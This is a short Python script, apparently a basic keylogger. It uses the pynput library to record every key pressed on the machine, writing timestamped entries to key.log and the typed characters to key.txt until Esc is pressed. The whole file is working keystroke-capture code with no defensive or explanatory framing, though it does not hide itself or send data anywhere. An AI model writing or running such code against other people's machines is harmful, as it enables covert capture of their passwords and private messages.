import pynput, logging

MAX_KEYS = 10
count = 0
keys = []

from pynput.keyboard import Key, Listener

# Set up logging to write to a file
logging.basicConfig(filename='key.log', level=logging.DEBUG, format='%(asctime)s: %(message)s')

# function to be called on key press
def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    
     # Log the key press
    logging.info("{0} pressed".format(key))
    
    if count >= MAX_KEYS:
        write_file(keys)
        keys = []
        count = 0


# funtion to write keys to a file       
def write_file(keys):
    
    try:
        with open("key.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
                
    finally:            
        keys.clear()

#funtion for key release 
def on_release(key):
    if key == Key.esc:
        write_file(keys)
        return False


# create the listener object and start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
